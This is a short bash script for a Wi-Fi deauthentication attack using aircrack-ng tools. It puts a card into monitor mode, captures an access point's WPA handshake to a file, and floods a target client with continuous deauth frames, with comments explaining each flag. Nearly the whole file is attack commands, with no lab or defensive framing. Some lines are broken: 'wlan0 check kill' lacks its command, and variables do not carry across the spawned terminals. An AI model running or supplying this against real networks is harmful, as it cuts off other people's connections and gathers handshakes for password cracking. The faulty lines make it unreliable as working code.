#! /bin/bash

#bash script to attempt deauth a client

#first put the network card into a monitor mode

#run with sudo 

wlan0 check kill

airmon-ng start wlan0

airodump-ng wlan0


qterminal
#to write in the new terminal now

echo "Enter channel and bssid :: "
read channel
read bssid
airodump-ng -w packet -c $channel -d $bssid wlan0mon
# -w write handshake to packet.cap
# -c channel number
# -d bssid of the access point, i.e., mac address
# -wlan0mon is a promiscous mode after putting the network card wlan0
# assuming into a monitor mode

qterminal
#in a new terminal
echo "Enter client mac address :: "
read client

aireplay-ng -c $client -a $bssid -0 0 wlan0mon
# -c is the client mac address
# -a is the access point or bssid, ie mac address of the router
# -0 or --deauth, is a deauthentication 0 value tells, to send packet 
# or traffic continously to deauthenticating

